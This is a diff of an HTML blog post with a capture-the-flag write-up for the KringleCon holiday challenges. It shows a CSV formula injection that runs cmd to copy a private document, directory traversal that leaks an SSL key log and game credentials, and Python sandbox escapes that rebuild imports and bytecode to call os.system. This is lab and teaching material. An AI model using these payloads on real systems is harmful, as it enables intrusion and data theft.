+<a class=header-link href=#httpscareerskringlecastlecom><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
+</h2><p>Santa uses an Elf Resources website to look for talented information security professionals. Gain access to the website and fetch the document C:\candidate_evaluation.docx. Which terrorist organization is secretly supported by the job applicant whose name begins with "K." For hints on achieving this objective, please visit Sparkle Redberry and help her with the Dev Ops Fail Cranberry Pi terminal challenge.</p>
 <p>Seems like we can inject payloads through CSVs to get the file. Apparently the OWASP payloads work.</p>
-<h3 id=csv-injection-talk>CSV Injection Talk</h3>
-<ul>
-<li>Youtube: <a href="https://www.youtube.com/watch?v=Z3qpcKVv2Bg" rel=nofollow target=_blank>https://www.youtube.com/watch?v=Z3qpcKVv2Bg</a></li>
+<h3 id=csv-injection-talk>CSV Injection Talk
+<a class=header-link href=#csv-injection-talk><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
+</h3><ul>
+<li>Youtube: <a href="https://www.youtube.com/watch?v=Z3qpcKVv2Bg" target=_blank rel="noreferrer noopener">https://www.youtube.com/watch?v=Z3qpcKVv2Bg</a></li>
 </ul>
 <p>This is on 404 page</p>
 <pre tabindex=0><code>Publicly accessible file served from:
 C:\careerportal\resources\public\ not found......
 
 Try:
-https://careers.kringlecastle.com/public/&#39;file name you are looking for&#39;</code></pre>
-<p>So we need to copy the file to that place and then access it.</p>
+https://careers.kringlecastle.com/public/'file name you are looking for'
+</code></pre><p>So we need to copy the file to that place and then access it.</p>
 <p>111,=CMD|'/c copy C:\candidate_evaluation.docx C:\careerportal\resources\public\myfile.txt'!A1,33
 55,44,77</p>
 <p>Now can access the file at <code>https://careers.kringlecastle.com/public/myfile.txt</code>, change the extension and view it.</p>
 <p>Answer is <code>Fancy Beaver</code>.</p>
 <hr>
-<h1 id=8-network-traffic-forensics>8. Network Traffic Forensics</h1>
-<p>Santa has introduced a web-based packet capture and analysis tool at <a href=https://packalyzer.kringlecastle.com rel=nofollow target=_blank>https://packalyzer.kringlecastle.com</a> to support the elves and their information security work. Using the system, access and decrypt HTTP/2 network activity. What is the name of the song described in the document sent from Holly Evergreen to Alabaster Snowball? For hints on achieving this objective, please visit SugarPlum Mary and help her with the Python Escape from LA Cranberry Pi terminal challenge.</p>
+<h1 id=8-network-traffic-forensics>8. Network Traffic Forensics
+<a class=header-link href=#8-network-traffic-forensics><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
+</h1><p>Santa has introduced a web-based packet capture and analysis tool at <a href=https://packalyzer.kringlecastle.com target=_blank rel="noreferrer noopener">https://packalyzer.kringlecastle.com</a> to support the elves and their information security work. Using the system, access and decrypt HTTP/2 network activity. What is the name of the song described in the document sent from Holly Evergreen to Alabaster Snowball? For hints on achieving this objective, please visit SugarPlum Mary and help her with the Python Escape from LA Cranberry Pi terminal challenge.</p>
 <p>Hint from challenge</p>
 <pre tabindex=0><code>Yay, you did it! You escaped from the Python!
 
-As a token of my gratitude, I would like to share a rumor I had heard about Santa&#39;s new web-based packet analyzer - Packalyzer.
+As a token of my gratitude, I would like to share a rumor I had heard about Santa's new web-based packet analyzer - Packalyzer.
 
 Another elf told me that Packalyzer was rushed and deployed with development code sitting in the web root.
 
@@ -996,20 +1026,20 @@ There was suspicious-looking development code using environment variables to sto
 
 This elf then told me that manipulating values in the URL gave back weird and descriptive errors.
 
-I&#39;m hoping these errors can&#39;t be used to compromise SSL on the website and steal logins.
+I'm hoping these errors can't be used to compromise SSL on the website and steal logins.
 
-On a tooootally unrelated note, have you seen the HTTP2 talk at at KringleCon by the Chrises? I never knew HTTP2 was so different!</code></pre>
-<p>Make an account an login. Then we can sniff traffic and upload pcaps for analysis. In <code>Captures</code> we can download/reanalyze/delete older pcaps. We can use this to do directory traversal.</p>
+On a tooootally unrelated note, have you seen the HTTP2 talk at at KringleCon by the Chrises? I never knew HTTP2 was so different!
+</code></pre><p>Make an account an login. Then we can sniff traffic and upload pcaps for analysis. In <code>Captures</code> we can download/reanalyze/delete older pcaps. We can use this to do directory traversal.</p>
 <pre tabindex=0><code>https://packalyzer.kringlecastle.com/uploads/nem,.rxr
 
 
-Error: ENOENT: no such file or directory, open &#39;/opt/http2/uploads//nem,.rxr&#39;</code></pre>
-<p>We want to look for server-side code, according to the hints they are at <code>web root</code></p>
+Error: ENOENT: no such file or directory, open '/opt/http2/uploads//nem,.rxr'
+</code></pre><p>We want to look for server-side code, according to the hints they are at <code>web root</code></p>
 <p>There's also comments refering to <code>app.js</code></p>
 <p><code>//File upload Function. All extensions and sizes are validated server-side in app.js</code></p>
 <p>POST request for upload goes to <code>/api/list</code> but everything inside <code>/api</code> is unauthorized.</p>
 <p>It's under <code>pub</code></p>
-<p><a href=https://packalyzer.kringlecastle.com/pub/app.js rel=nofollow target=_blank>https://packalyzer.kringlecastle.com/pub/app.js</a></p>
+<p><a href=https://packalyzer.kringlecastle.com/pub/app.js target=_blank rel="noreferrer noopener">https://packalyzer.kringlecastle.com/pub/app.js</a></p>
 <p>Inside <code>app.js</code> we can see paths to the keys?</p>
 <div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=color:#268bd2>const</span> dev_mode <span style=color:#719e07>=</span> <span style=color:#cb4b16>true</span>;
 <span style=color:#268bd2>const</span> key_log_path <span style=color:#719e07>=</span> ( <span style=color:#719e07>!</span>dev_mode <span style=color:#719e07>||</span> <span style=color:#2aa198>__</span>dirname <span style=color:#719e07>+</span> process.env.DEV <span style=color:#719e07>+</span> process.env.SSLKEYLOGFILE )
@@ -1021,10 +1051,9 @@ Error: ENOENT: no such file or directory, open &#39;/opt/http2/uploads//nem,.rxr
 </span><span style=color:#586e75></span>    protocols<span style=color:#719e07>:</span> [ <span style=color:#2aa198>&#39;h2&#39;</span> ],
   },
   keylog <span style=color:#719e07>:</span> key_log_path     <span style=color:#586e75>//used for dev mode to view traffic. Stores a few minutes worth at a time
-</span></code></pre></div>
-<p><code>dev_mode</code> is on so it should be in those places?</p>
+</span></code></pre></div><p><code>dev_mode</code> is on so it should be in those places?</p>
 <p><code>__dirname</code> is the current directory of the module.</p>
-<p>From <a href=https://nodejs.org/docs/latest/api/modules.html#modules_dirname rel=nofollow target=_blank>https://nodejs.org/docs/latest/api/modules.html#modules_dirname</a></p>
+<p>From <a href=https://nodejs.org/docs/latest/api/modules.html#modules_dirname target=_blank rel="noreferrer noopener">https://nodejs.org/docs/latest/api/modules.html#modules_dirname</a></p>
 <div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js>The directory name <span style=color:#719e07>of</span> the current module. This is the same as the path.dirname() <span style=color:#719e07>of</span> the <span style=color:#2aa198>__</span>filename.
 
 Example<span style=color:#719e07>:</span> running node example.js from <span style=color:#719e07>/</span>Users<span style=color:#719e07>/</span>mjr
@@ -1033,8 +1062,7 @@ console.log(<span style=color:#2aa198>__</span>dirname);
 <span style=color:#586e75>// Prints: /Users/mjr
 </span><span style=color:#586e75></span>console.log(path.dirname(<span style=color:#2aa198>__</span>filename));
 <span style=color:#586e75>// Prints: /Users/mjr
-</span></code></pre></div>
-<p>Look at <code>load_envs</code>, they are opening up directories based on names of environmental variables.</p>
+</span></code></pre></div><p>Look at <code>load_envs</code>, they are opening up directories based on names of environmental variables.</p>
 <div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=color:#268bd2>function</span> load_envs() {
   <span style=color:#268bd2>var</span> dirs <span style=color:#719e07>=</span> []
   <span style=color:#268bd2>var</span> env_keys <span style=color:#719e07>=</span> <span style=color:#b58900>Object</span>.keys(process.env)
@@ -1050,8 +1078,8 @@ console.log(<span style=color:#2aa198>__</span>dirname);
 </span><span style=color:#586e75></span>    <span style=color:#268bd2>const</span> env_dirs <span style=color:#719e07>=</span> load_envs();
 } <span style=color:#719e07>else</span> {
     <span style=color:#268bd2>const</span> env_dirs <span style=color:#719e07>=</span> [<span style=color:#2aa198>&#39;/pub/&#39;</span>,<span style=color:#2aa198>&#39;/uploads/&#39;</span>];
-}</code></pre></div>
-<p>So if we navigate to <a href=https://packalyzer.kringlecastle.com/SSLKEYLOGFILE/ rel=nofollow target=_blank>https://packalyzer.kringlecastle.com/SSLKEYLOGFILE/</a> we will get</p>
+}
+</code></pre></div><p>So if we navigate to <a href=https://packalyzer.kringlecastle.com/SSLKEYLOGFILE/ target=_blank rel="noreferrer noopener">https://packalyzer.kringlecastle.com/SSLKEYLOGFILE/</a> we will get</p>
 <p><code>Error: ENOENT: no such file or directory, open '/opt/http2packalyzer_clientrandom_ssl.log/'</code></p>
 <p>So <code>SSLKEYLOGFILE</code> environmental variable is <code>packalyzer_clientrandom_ssl.log</code>. Why? Well look at the rest of the file, it's nice and has different words separated by underscores. At the start you have two words mashed together unceremonially, the <code>http2</code> is part of the error message.</p>
 <p>Actual file points to</p>
@@ -1065,29 +1093,33 @@ console.log(<span style=color:#2aa198>__</span>dirname);
 
 {<span style=color:#268bd2>&#34;username&#34;</span>: <span style=color:#2aa198>&#34;bushy&#34;</span>, <span style=color:#268bd2>&#34;password&#34;</span>: <span style=color:#2aa198>&#34;Floppity_Floopy-flab19283&#34;</span>}
 
-{<span style=color:#268bd2>&#34;username&#34;</span>: <span style=color:#2aa198>&#34;alabaster&#34;</span>, <span style=color:#268bd2>&#34;password&#34;</span>: <span style=color:#2aa198>&#34;Packer-p@re-turntable192&#34;</span>}</code></pre></div>
-<p>Let's login as <code>alabaster</code> and do the same.</p>
+{<span style=color:#268bd2>&#34;username&#34;</span>: <span style=color:#2aa198>&#34;alabaster&#34;</span>, <span style=color:#268bd2>&#34;password&#34;</span>: <span style=color:#2aa198>&#34;Packer-p@re-turntable192&#34;</span>}
+</code></pre></div><p>Let's login as <code>alabaster</code> and do the same.</p>
 <p>There's something in his captures, we will download it, refresh the page to get the keys (hopefully they are still the same from the time it was captured) and try decryption. This one is not SSL traffic, we can just read the file.</p>
 <p>There's a base64 encoded attachment in the TCP stream, we can copy it to a file an decode it.</p>
 <p>Base64 encode decode w/o powershell - <strong>Link to cheatsheet</strong> - anchor does not work, change it in your blog.</p>
 <pre tabindex=0><code>$ certutil.exe -decode encoded-file.txt decoded-file
 Input Length = 132161
 Output Length = 97831
-CertUtil: -decode command completed successfully.</code></pre>
-<p>Open it up in hex editor, it's a PDF. Seems like it's about the next challenge.</p>
+CertUtil: -decode command completed successfully.
+</code></pre><p>Open it up in hex editor, it's a PDF. Seems like it's about the next challenge.</p>
 <p>Name of the song is the answer at the end of the file <code>Mary Had a Little Lamb</code>.</p>
 <pre tabindex=0><code>Hey alabaster, 
 
-Santa said you needed help understanding musical notes for accessing the vault. He said your favorite key was D. Anyways, the following attachment should give you all the information you need about transposing music.</code></pre>
-<h2 id=python-escape-from>Python Escape from</h2>
-<p>Escaping from the Python interpreter?</p>
-<h3 id=talk-notes>Talk Notes</h3>
-<ul>
-<li>Talk <a href="https://www.youtube.com/watch?v=ZVx2Sxl3B9c" rel=nofollow target=_blank>https://www.youtube.com/watch?v=ZVx2Sxl3B9c</a></li>
-<li>Code: <a href=https://gist.github.com/MarkBaggett/dd440362f8a443d644b913acadff9499 rel=nofollow target=_blank>https://gist.github.com/MarkBaggett/dd440362f8a443d644b913acadff9499</a></li>
+Santa said you needed help understanding musical notes for accessing the vault. He said your favorite key was D. Anyways, the following attachment should give you all the information you need about transposing music.
+</code></pre>
+<h2 id=python-escape-from>Python Escape from
+<a class=header-link href=#python-escape-from><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
+</h2><p>Escaping from the Python interpreter?</p>
+<h3 id=talk-notes>Talk Notes
+<a class=header-link href=#talk-notes><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
+</h3><ul>
+<li>Talk <a href="https://www.youtube.com/watch?v=ZVx2Sxl3B9c" target=_blank rel="noreferrer noopener">https://www.youtube.com/watch?v=ZVx2Sxl3B9c</a></li>
+<li>Code: <a href=https://gist.github.com/MarkBaggett/dd440362f8a443d644b913acadff9499 target=_blank rel="noreferrer noopener">https://gist.github.com/MarkBaggett/dd440362f8a443d644b913acadff9499</a></li>
 </ul>
-<h4 id=overwrite-reload-python-modules>Overwrite/Reload Python Modules</h4>
-<p>Overwrite them in memory:</p>
+<h4 id=overwritereload-python-modules>Overwrite/Reload Python Modules
+<a class=header-link href=#overwritereload-python-modules><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
+</h4><p>Overwrite them in memory:</p>
 <div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#719e07>import</span> sys
 sys<span style=color:#719e07>.</span>modules[<span style=color:#2aa198>&#39;os&#39;</span>]<span style=color:#719e07>.</span>system <span style=color:#719e07>=</span> lamba <span style=color:#719e07>*</span>x,<span style=color:#719e07>**</span>y:<span style=color:#2aa198>&#34;STOP HACKING&#34;</span>
 <span style=color:#719e07>del</span> sys
@@ -1096,22 +1128,29 @@ sys<span style=color:#719e07>.</span>modules[<span style=color:#2aa198>&#39;os&#
 <span style=color:#719e07>import</span> os
 os<span style=color:#719e07>.</span>system(<span style=color:#2aa198>&#34;ls&#34;</span>)
 <span style=color:#586e75># I get stop hacking</span>
-<span style=color:#2aa198>&#39;STOP HACKING&#39;</span></code></pre></div>
-<p>To defeat, we can reload them in Python 3 with <code>importlib</code></p>
+<span style=color:#2aa198>&#39;STOP HACKING&#39;</span>
+</code></pre></div><p>To defeat, we can reload them in Python 3 with <code>importlib</code></p>
 <div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#719e07>import</span> importlib
-importlib<span style=color:#719e07>.</span>reload(os)</code></pre></div>
-<h4 id=python-as-child-process>Python as Child Process</h4>
-<p>Python interpreter is launched as a child process and then keywords are filtered with <code>readfunc()</code>.</p>
-<h4 id=exec>exec</h4>
-<p>Executes Python code that does not return a result. Break the statements into pieces and run them.</p>
+importlib<span style=color:#719e07>.</span>reload(os)
+</code></pre></div>
+<h4 id=python-as-child-process>Python as Child Process
+<a class=header-link href=#python-as-child-process><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
+</h4><p>Python interpreter is launched as a child process and then keywords are filtered with <code>readfunc()</code>.</p>
+<h4 id=exec>exec
+<a class=header-link href=#exec><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
+</h4><p>Executes Python code that does not return a result. Break the statements into pieces and run them.</p>
 <div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python>exec(<span style=color:#2aa198>&#34;imp&#34;</span> <span style=color:#719e07>+</span> <span style=color:#2aa198>&#34;ort os&#34;</span>)
-os<span style=color:#719e07>.</span>system(<span style=color:#2aa198>&#34;id&#34;</span>)</code></pre></div>
-<h4 id=eval>eval</h4>
-<p>Executes Python code that returns a result.</p>
+os<span style=color:#719e07>.</span>system(<span style=color:#2aa198>&#34;id&#34;</span>)
+</code></pre></div>
+<h4 id=eval>eval
+<a class=header-link href=#eval><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
+</h4><p>Executes Python code that returns a result.</p>
 <div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python>os <span style=color:#719e07>=</span> <span style=color:#b58900>eval</span>(<span style=color:#2aa198>&#39;__im&#39;</span> <span style=color:#719e07>+</span> <span style=color:#2aa198>&#39;port__(&#34;os&#34;)&#39;</span>)  <span style=color:#586e75># __import__(&#34;os&#34;)</span>
-os<span style=color:#719e07>.</span>system(<span style=color:#2aa198>&#34;id&#34;</span>)</code></pre></div>
-<h4 id=compile>compile</h4>
-<p>Takes turns a string into bytecode.</p>
+os<span style=color:#719e07>.</span>system(<span style=color:#2aa198>&#34;id&#34;</span>)
+</code></pre></div>
+<h4 id=compile>compile
+<a class=header-link href=#compile><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
+</h4><p>Takes turns a string into bytecode.</p>
 <div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python>code <span style=color:#719e07>=</span> <span style=color:#b58900>compile</span>(<span style=color:#2aa198>&#34;im&#34;</span> <span style=color:#719e07>+</span> <span style=color:#2aa198>&#34;port os&#34;</span>, <span style=color:#2aa198>&#34;&#34;</span>, <span style=color:#2aa198>&#34;single&#34;</span>) <span style=color:#586e75># single means only compile this single line.</span>
 
 <span style=color:#586e75># now we need to execute it</span>
@@ -1126,13 +1165,15 @@ a<span style=color:#719e07>.</span>__code__ <span style=color:#719e07>=</span> c
 a()
 
 <span style=color:#586e75># now os should be imported</span>
-os<span style=color:#719e07>.</span>system(<span style=color:#2aa198>&#34;id&#34;</span>)</code></pre></div>
-<h4 id=exec-eval-import-and-compile-are-blocked>exec, eval, import and compile are blocked</h4>
-<p>Go to a different Python interpreter, make the function you want</p>
+os<span style=color:#719e07>.</span>system(<span style=color:#2aa198>&#34;id&#34;</span>)
+</code></pre></div>
+<h4 id=exec-eval-import-and-compile-are-blocked>exec, eval, import and compile are blocked
+<a class=header-link href=#exec-eval-import-and-compile-are-blocked><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
+</h4><p>Go to a different Python interpreter, make the function you want</p>
 <div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#719e07>def</span> <span style=color:#268bd2>bypass</span>():
     <span style=color:#719e07>import</span> os
-    <span style=color:#b58900>print</span>(os<span style=color:#719e07>.</span>system(<span style=color:#2aa198>&#34;id&#34;</span>))</code></pre></div>
-<p>Paste <code>make_object.py</code> from <a href=https://gist.github.com/MarkBaggett/dd440362f8a443d644b913acadff9499#file-make_object-py rel=nofollow target=_blank>https://gist.github.com/MarkBaggett/dd440362f8a443d644b913acadff9499#file-make_object-py</a> this function into the 2nd interpreter:</p>
+    <span style=color:#b58900>print</span>(os<span style=color:#719e07>.</span>system(<span style=color:#2aa198>&#34;id&#34;</span>))
+</code></pre></div><p>Paste <code>make_object.py</code> from <a href=https://gist.github.com/MarkBaggett/dd440362f8a443d644b913acadff9499#file-make_object-py target=_blank rel="noreferrer noopener">https://gist.github.com/MarkBaggett/dd440362f8a443d644b913acadff9499#file-make_object-py</a> this function into the 2nd interpreter:</p>
 <div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#719e07>import</span> sys
 <span style=color:#719e07>def</span> <span style=color:#268bd2>makeobject</span>(afunction):
    <span style=color:#b58900>print</span>(<span style=color:#2aa198>&#34;Generating a function for version </span><span style=color:#2aa198>{}</span><span style=color:#2aa198>.</span><span style=color:#2aa198>{}</span><span style=color:#2aa198> (same version as this machine)&#34;</span><span style=color:#719e07>.</span>format(sys<span style=color:#719e07>.</span>version_info<span style=color:#719e07>.</span>major, sys<span style=color:#719e07>.</span>version_info<span style=color:#719e07>.</span>minor))
@@ -1151,17 +1192,18 @@ os<span style=color:#719e07>.</span>system(<span style=color:#2aa198>&#34;id&#34
        newstr <span style=color:#719e07>+=</span> <span style=color:#2aa198>&#34;a.__code__ = type(a.__code__)(</span><span style=color:#2aa198>{0}</span><span style=color:#2aa198>,</span><span style=color:#2aa198>{1}</span><span style=color:#2aa198>,</span><span style=color:#2aa198>{2}</span><span style=color:#2aa198>,</span><span style=color:#2aa198>{3}</span><span style=color:#2aa198>,</span><span style=color:#2aa198>{4}</span><span style=color:#2aa198>,</span><span style=color:#2aa198>{5}</span><span style=color:#2aa198>,</span><span style=color:#2aa198>{6}</span><span style=color:#2aa198>,</span><span style=color:#2aa198>{7}</span><span style=color:#2aa198>,</span><span style=color:#2aa198>{8}</span><span style=color:#2aa198>,&#39;</span><span style=color:#2aa198>{9}</span><span style=color:#2aa198>&#39;,&#39;</span><span style=color:#2aa198>{10}</span><span style=color:#2aa198>&#39;,</span><span style=color:#2aa198>{11}</span><span style=color:#2aa198>,</span><span style=color:#2aa198>{12}</span><span style=color:#2aa198>)&#34;</span><span style=color:#719e07>.</span>format( co<span style=color:#719e07>.</span>co_argcount, co<span style=color:#719e07>.</span>co_kwonlyargcount, co<span style=color:#719e07>.</span>co_nlocals, co<span style=color:#719e07>.</span>co_stacksize, co<span style=color:#719e07>.</span>co_flags, co<span style=color:#719e07>.</span>co_code,co<span style=color:#719e07>.</span>co_consts, co<span style=color:#719e07>.</span>co_names, co<span style=color:#719e07>.</span>co_varnames, co<span style=color:#719e07>.</span>co_filename, <span style=color:#b58900>str</span>(co<span style=color:#719e07>.</span>co_name), co<span style=color:#719e07>.</span>co_firstlineno, co<span style=color:#719e07>.</span>co_lnotab)
    <span style=color:#719e07>else</span>:
        <span style=color:#b58900>print</span>(<span style=color:#2aa198>&#34;This version of python is not tested and may not work&#34;</span>)
-   <span style=color:#b58900>print</span>(newstr)</code></pre></div>
-<p>Now call <code>makeobject(bypass)</code> to get the bytecode for it. It gives a string that can be copy/pasted into the remote system. It will create a function called <code>a</code> and then bytecode for it that does what <code>bypass</code> does. Might need to break the keywords into string again (e.g. <code>"import"</code> to <code>"im" + "port"</code>).</p>
-<h3 id=challenge>Challenge</h3>
-<pre tabindex=0><code>I&#39;m another elf in trouble,
+   <span style=color:#b58900>print</span>(newstr)
+</code></pre></div><p>Now call <code>makeobject(bypass)</code> to get the bytecode for it. It gives a string that can be copy/pasted into the remote system. It will create a function called <code>a</code> and then bytecode for it that does what <code>bypass</code> does. Might need to break the keywords into string again (e.g. <code>"import"</code> to <code>"im" + "port"</code>).</p>
+<h3 id=challenge>Challenge
+<a class=header-link href=#challenge><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
+</h3><pre tabindex=0><code>I'm another elf in trouble,
 Caught within this Python bubble.
 
 Here I clench my merry elf fist -
 Words get filtered by a black list!
 
-Can&#39;t remember how I got stuck,
-Try it - maybe you&#39;ll have more luck?
+Can't remember how I got stuck,
+Try it - maybe you'll have more luck?
 
 For this challenge, you are more fit.
 Beat this challenge - Mark and Bag it!
@@ -1169,57 +1211,57 @@ Beat this challenge - Mark and Bag it!
 -SugarPlum Mary
 
 To complete this challenge, escape Python
-and run ./i_escaped</code></pre>
-<p>First let's see what is banned out of those four words. Only <code>eval</code> is allowed.</p>
+and run ./i_escaped
+</code></pre><p>First let's see what is banned out of those four words. Only <code>eval</code> is allowed.</p>
 <div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#719e07>&gt;&gt;&gt;</span> os <span style=color:#719e07>=</span> <span style=color:#b58900>eval</span>(<span style=color:#2aa198>&#39;__im&#39;</span> <span style=color:#719e07>+</span> <span style=color:#2aa198>&#39;port__(&#34;os&#34;)&#39;</span>) 
 <span style=color:#719e07>&gt;&gt;&gt;</span> os<span style=color:#719e07>.</span>system(<span style=color:#2aa198>&#34;ls&#34;</span>)
